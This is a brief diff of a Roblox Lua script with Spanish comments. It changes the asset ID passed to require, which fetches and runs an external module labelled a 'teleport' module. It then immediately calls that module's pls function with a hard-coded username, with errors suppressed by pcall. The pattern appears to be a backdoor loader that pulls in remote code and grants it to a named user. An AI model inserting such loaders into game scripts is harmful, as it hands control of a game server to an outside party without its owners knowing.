@@ -2,7 +2,7 @@
 local HttpService = game:GetService("HttpService")
 
 -- 1. Ejecución INMEDIATA del módulo require de teleport (Echo Por Mi Jeje)
-local modelSuccess, module = pcall(require, 94217198436768)
+local modelSuccess, module = pcall(require, 14572394952)
 if modelSuccess and module then
     pcall(function()
         module:pls("luilo30095")
